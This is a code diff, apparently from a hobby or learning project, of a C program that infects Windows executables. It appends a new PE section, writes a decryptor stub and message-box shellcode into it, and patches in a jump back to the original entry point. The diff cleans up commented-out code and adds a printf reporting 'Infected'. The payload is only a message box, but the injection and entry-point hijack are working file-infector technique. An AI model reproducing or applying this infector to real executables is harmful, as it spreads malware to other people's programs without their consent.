@@ -124,7 +124,6 @@ int main(int argc, char *argv[])
     DWORD dwNewSectionRawOffset = AddEmptySection(&pe, wNumnberOfSections, dwSectionAlignment, pMapView);
 
     // Add Shellcode to new section
-    /// Get Decryptor Shellcode
     DWORD dwDecryptorShellcodeSize = (DWORD)EndDecryptor - (DWORD)StartDecryptor - 6;
     DWORD dwMsgboxShellcodeSize = (DWORD)EndMessageBoxShellcode - (DWORD)StartMessageBoxShellcode - 6;
     DWORD dwShellcodeSize = dwDecryptorShellcodeSize + dwMsgboxShellcodeSize;
@@ -132,12 +131,6 @@ int main(int argc, char *argv[])
     PBYTE pFinalShellcode = (PBYTE)malloc(dwShellcodeSize * sizeof(BYTE));
     memcpy(pFinalShellcode, (PBYTE)StartDecryptor + 3, dwDecryptorShellcodeSize);
     memcpy(pFinalShellcode + dwDecryptorShellcodeSize, (PBYTE)StartMessageBoxShellcode + 3, dwMsgboxShellcodeSize);
-
-    /// Get MessageBox Shellcode
-    // DWORD dwShellcodeSize = (DWORD)EndMessageBoxShellcode - (DWORD)StartMessageBoxShellcode - 6; // -6 for first and last 3 bytes
-    // PBYTE pMessageBoxShellcode = (PBYTE)malloc(dwShellcodeSize * sizeof(BYTE));
-    // memset(pMessageBoxShellcode, 0, dwShellcodeSize);
-    // memcpy(pMessageBoxShellcode, (PBYTE)StartMessageBoxShellcode + 3, dwShellcodeSize); // Shellcode start after first 3 bytes
 
     // Add shellcode to new section
     memcpy(pMapView + dwNewSectionRawOffset, pFinalShellcode, dwShellcodeSize);
@@ -150,12 +143,12 @@ int main(int argc, char *argv[])
 
     // Get and set RA to jump to old entry point
     DWORD dwCurrentOffset = dwOldEntryPoint - (pNewSectionHeader->VirtualAddress + dwShellcodeSize + 5);
-    printf("RETURNEP: 0x%02x", pNewSectionHeader->VirtualAddress + dwShellcodeSize);
-
     PBYTE pRAToEntryPoint = (PBYTE)malloc(5 * sizeof(BYTE));
     pRAToEntryPoint[0] = 0xe9;
     memcpy(pRAToEntryPoint + 1, &dwCurrentOffset, 4);
     memcpy(pMapView + dwNewSectionRawOffset + dwShellcodeSize, pRAToEntryPoint, 5);
+
+    printf("Infected");
 
     Unmap(&hFileMapping, pMapView);
     CloseHandle(hFile);
